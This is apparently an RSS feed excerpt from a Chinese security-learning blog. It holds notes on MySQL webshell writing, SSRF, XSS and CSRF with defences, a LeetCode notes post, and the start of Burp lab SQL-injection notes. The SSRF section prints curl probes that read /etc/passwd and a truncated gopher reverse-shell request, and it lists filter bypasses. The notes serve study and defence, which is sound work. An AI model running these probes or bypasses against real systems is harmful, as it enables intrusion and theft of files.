&lt;li&gt;测试各数据库独有的连接符&lt;/li&gt;
&lt;li&gt;查询数据库版本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mysql-数据库站点无法连接的常见原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-数据库站点无法连接的常见原因&#34;&gt;#&lt;/a&gt; MySQL 数据库站点无法连接的常见原因&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;数据库只允许本地连接&lt;/li&gt;
&lt;li&gt;站库分离&lt;/li&gt;
&lt;li&gt;数据库服务器端口被占用或更改了端口&lt;/li&gt;
&lt;li&gt;访问权限不正确&lt;/li&gt;
&lt;li&gt;数据库未启动&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mysql-写-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-写-shell&#34;&gt;#&lt;/a&gt; MySQL 写 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;通过 outfile 写入 shell&lt;/li&gt;
&lt;li&gt;将一句话木马作为数据插入表中并查询导出&lt;/li&gt;
&lt;li&gt;开启全局日志写入 shell&lt;/li&gt;
&lt;li&gt;慢查询日志写入 shell（仅有在查询时间超过系统设定时间时才会写入 shell）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mysql-无法写-shell-的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-无法写-shell-的原因&#34;&gt;#&lt;/a&gt; MySQL 无法写 shell 的原因&lt;/h3&gt;
&lt;p&gt;1.My.ini 配置 secure-file-priv 为空或 / 则可以导出导入无限制&lt;br /&gt;
 2. 绝对路径不正确&lt;br /&gt;
 3. 没有读写权限&lt;br /&gt;
 4. 没有开启全局日志或慢查询日志&lt;/p&gt;
&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;h3 id=&#34;原理-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-2&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;服务器请求伪造，服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，服务器就以服务器自己的身份去访问其他服务器的资源。&lt;/p&gt;
&lt;h3 id=&#34;挖掘-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-2&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;分享：通过 URL 地址分享网页内容&lt;/li&gt;
&lt;li&gt;转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览&lt;/li&gt;
&lt;li&gt;在线翻译：通过 URL 地址翻译对应文本内容&lt;/li&gt;
&lt;li&gt;图片加载与下载：通过 URL 地址加载或下载图片&lt;/li&gt;
&lt;li&gt;图片、文章收藏功能&lt;/li&gt;
&lt;li&gt;未公开的 api 实现以及其他调用 URL 的功能&lt;/li&gt;
&lt;li&gt;从 URL 关键字中寻找，Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-2&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;1.dict 协议，泄露安装软件版本信息，查看端口，操作内网 redis 服务等：dict://serverip:port / 命令：参数&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&amp;#x27; // 利用 dict 探测端口 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2.file 协议，在有回显的情况下，利用 file 协议可以读取任意内容&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=file:///etc/passwd&amp;#x27; // 利用 file 协议查看文件 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3.gopher 协议，gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&amp;#x27; // 利用 gopher 反弹 shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4.http/s 协议，探测内网主机存活&lt;/p&gt;
&lt;h3 id=&#34;防御-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-2&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;过滤返回信息&lt;/li&gt;
&lt;li&gt;统一错误信息，避免用户根据错误信息判断端口状态&lt;/li&gt;
&lt;li&gt;限制可以请求的端口&lt;/li&gt;
&lt;li&gt;内网 ip 黑名单&lt;/li&gt;
&lt;li&gt;禁用不需要的协议&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-2&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;采用短网址绕过&lt;/li&gt;
&lt;li&gt;对 ip 地址进行进制转换&lt;/li&gt;
&lt;li&gt;利用特殊域名，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuaW8=&#34;&gt;example.io&lt;/span&gt; 可以指向任意域名，则 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS5leGFtcGxlLmlv&#34;&gt;127.0.0.1.example.io&lt;/span&gt; 最终会被解析为 127.0.0.1&lt;/li&gt;
&lt;li&gt;利用 [::]，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMQ==&#34;&gt;http://127.0.0.1&lt;/span&gt; &amp;gt;&amp;gt; http://[::127.0.0.1]&lt;/li&gt;
&lt;li&gt;利用句号，比如 127.0.0.1  &amp;gt;&amp;gt; 127。0。0。1&lt;br /&gt;
7.CRLF 编码绕过&lt;/li&gt;
&lt;li&gt;使用封闭的字母和数字&lt;/li&gt;
&lt;li&gt;当限制只能使用 http 协议时，可以采取 302 跳转或短地址&lt;/li&gt;
&lt;li&gt;限制为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29t&#34;&gt;example.com&lt;/span&gt; 域名时，采用 http 基本身份认证的方式绕过，即 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54eHguY29tQHd3dy54eGMuY29t&#34;&gt;http://www.xxx.com@www.xxc.com&lt;/span&gt;，在对 @解析域名中，不同的处理函数存在处理差异&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h2&gt;
&lt;h3 id=&#34;原理-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-3&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;web 页面插入恶意 Js 代码，浏览器解析执行获取用户 cookie。&lt;/p&gt;
&lt;h3 id=&#34;挖掘-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-3&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;重灾区：评论区、留言区、个人信息、订单信息等&lt;/li&gt;
&lt;li&gt;针对型：站内信、网页即时通讯、私信、意见反馈&lt;/li&gt;
&lt;li&gt;存在风险：搜索框、当前目录、图片属性等&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-3&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;存储型 XSS，反射型 XSS，DOM 型 XSS&lt;/p&gt;
&lt;h3 id=&#34;防御-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-3&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;正则过滤（标签 /js 代码 / 事件）&lt;/li&gt;
&lt;li&gt;用户的输入进行 html 编码输出（无法进行闭合）&lt;/li&gt;
&lt;li&gt;服务端设置会话 Cookie 的 HTTP Only 属性（不能获取 cookie）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-3&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;爆破寻找是否存在能够使用的标签和属性。&lt;/li&gt;
&lt;li&gt;利用一些框架或模板的特性，比如在 使用 JavaScript template literal 的页面中 ，如果 `` 之间包含 ${code}，就会执行 code。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xss-的功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss-的功能&#34;&gt;#&lt;/a&gt; XSS 的功能&lt;/h3&gt;
&lt;p&gt;获取 cookie、获取管理员 ip、xss 蠕虫、钓鱼攻击、前端 JS 挖矿、键盘记录、屏幕截图。&lt;/p&gt;
&lt;h2 id=&#34;csrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h2&gt;
&lt;h3 id=&#34;原理-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-4&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;指利用受害者尚未失效的身份认证信息、（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害人的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（转账，改密码等）。&lt;/p&gt;
&lt;h3 id=&#34;方法-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-4&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;1.GET 型：直接改 URL 就好&lt;br /&gt;
 2.POST 型：想办法利用用户数据提交表单&lt;/p&gt;
&lt;h3 id=&#34;防御-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-4&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;校验 token：让请求带上一个额外的 csrf_token，来确保请求是通过网站的前端页面发送的。这个 csrf_token 由服务器颁发，不要放到 cookie 里，要通过其他方式提供给网站的前端页面，一种方式是放到 DOM 上。前端请求时就会从 DOM 找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/li&gt;
&lt;li&gt;使用严格的 SameSite：Cookie 有一个 SameSite 属性，设置为严格模式（非 none 值），可以让其他网站的中跨域请求不带上 Cookie。&lt;/li&gt;
&lt;li&gt;通过 Referer 判断：如果在网站中发送的请求，HTTP 头字段 Referer 中的域名就是当前网站。如果是其他网站发起的请求，Referer 就是这个网站域名。服务端可以利用这个 Referer 判断请求是否在网站页面中发起的。此外还可以利用 Origin 头字段，它通常在跨域请求时会携带上。但 Referer 并不完全可靠，在一些老旧的浏览器在实现上可能会有一些问题，有丢失的可能。&lt;/li&gt;
&lt;li&gt;人机校验：加一个短信校验、邮箱校验、谷歌万恶的九宫格什么的，确保是一个人在尝试发这个请求。可以吊打所有攻击，缺点是用户体验不太好。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-4&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;h4 id=&#34;csrf_token-的位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-的位置&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 的位置&lt;/h4&gt;
&lt;p&gt;前端页面中（DOM 或全局变量中）&lt;/p&gt;
&lt;h4 id=&#34;csrf_token-原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-原理&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 原理&lt;/h4&gt;
&lt;p&gt;前端请求时就会从 前端页面（DOM 或全局变量）找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/p&gt;
&lt;h4 id=&#34;csrf_token-绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-绕过&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 绕过&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;更改请求方式&lt;/li&gt;
&lt;li&gt;点击劫持&lt;/li&gt;
&lt;li&gt;使用自己的 token，利用后台漏洞，替换对方的 token 进行验证&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/29/leetcode/</guid>
            <title>leetcode</title>
            <link>http://ericcd.com/2022/11/29/leetcode/</link>
            <category term="LeetCode" scheme="http://ericcd.com/categories/LeetCode/" />
            <category term="LeetCode" scheme="http://ericcd.com/tags/LeetCode/" />
            <pubDate>Tue, 29 Nov 2022 19:26:56 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;LeetCode 记录。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用单调栈求坡的最大宽度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;填充每个节点的下一个右侧节点指针 II：&lt;br /&gt;
给定一个二叉树，填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数字范围按位与：&lt;br /&gt;
给你两个整数 left 和 right ，表示区间 [left, right] ，返回此区间内所有数字 按位与 的结果（包含 left 、right 端点）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;清空 vector 元素并释放空间。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vector&amp;lt;int&amp;gt; ().swap (Vector);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;重新排列单词间的空格。&lt;br /&gt;
使用流区分字符和空格；string 的创建方式。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;string reorderSpaces (string text) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           vector&amp;lt;string&amp;gt;  str_vec;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           int count = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           string word, ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           stringstream in (text);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           while (in &amp;gt;&amp;gt; word)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               str_vec.push_back (word);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               count += word.size (); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           if (str_vec.size () == 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              ans = str_vec [0];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                string space ((text.size () - count)/(str_vec.size () - 1), &amp;#x27; &amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                for (int i =0; i&amp;lt; str_vec.size () - 1; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       ans += str_vec [i] + space;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ans += str_vec.back ();        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return ans + string (text.size () - ans.size (), &amp;#x27; &amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数组的相对排序。&lt;br /&gt;
unordered_map，hash 表的使用；sort 的自定义排序方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;旋转数字&lt;br /&gt;
 8.Lambda 表达式&lt;br /&gt;
该表达式的使用&lt;br /&gt;
 9.c++ 二分查找函数&lt;br /&gt;
 lower_bound ()、upper_bound ()、equal_range () 以及 binary_search ()。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前缀和矩阵&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sum = A [x1..x2][y1..y2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    = P [x2][y2] - P [x1 - 1][y2] - P [x2][y1 - 1] + P [x1 - 1][y1 - 1]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;差分数组&lt;br /&gt;
有利于对固定数组大量做区间加减并查询&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前缀和&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/22/BurpLab/</guid>
            <title>BurpLab</title>
            <link>http://ericcd.com/2022/11/22/BurpLab/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Tue, 22 Nov 2022 20:13:02 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用 select 判断列数和获取返回值时，有时 SELECT 1,2,3 不行而 SELECT NULL,NULL,NULL 可以，可能是因为 sql 的返回值类型需要与后端接收的类型相匹配，SELECT 1,2,3 返回的都是数字，而使用 NULL 会返回不确定类型 NULL。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只能返回一条字符串语句，但是需要读取多个字符串的值时，可以使用字符串拼接。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  &amp;#x27;foo&amp;#x27;||&amp;#x27;bar&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft:  &amp;#x27;foo&amp;#x27;+&amp;#x27;bar&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL:  foo&amp;#x27;||&amp;#x27;bar&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL:  &amp;#x27;foo&amp;#x27; &amp;#x27;bar&amp;#x27; [Note the space between the two strings],  CONCAT (&amp;#x27;foo&amp;#x27;,&amp;#x27;bar&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Oracle 中，每一条 SELECT 语句后续都要跟一个 FROM，如果不确定要搜索哪个表，可以使用虚表 dual 来进行测试，例如 SELECT NULL FROM dual。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取数据库版本信息。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT banner FROM v$version,  SELECT version FROM v$instance&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft:  SELECT @@version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL:  SELECT version ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL:  SELECT @@version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取数据库中存储的表名以及其中的列名。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT * FROM all_tables,  SELECT * FROM all_tab_columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = 